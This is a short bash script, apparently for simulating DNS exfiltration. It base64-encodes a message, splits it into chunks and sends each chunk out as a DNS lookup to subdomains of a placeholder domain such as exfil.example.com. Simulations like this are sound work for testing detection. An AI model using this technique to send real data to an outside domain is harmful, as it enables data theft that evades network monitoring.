#!/bin/bash
# simulate_dns_exfil.sh <domain-base> <message>
# Usage: ./simulate_dns_exfil.sh exfil.test.local "secret-data"

DOMAIN=${1:-exfil.example.com}
MSG=${2:-"TEST-EXFIL"}
for chunk in $(echo -n "$MSG" | base64 | fold -w 30); do
  host "${chunk}.${DOMAIN}" >/dev/null 2>&1 || true
  sleep 0.2
done
echo "done"
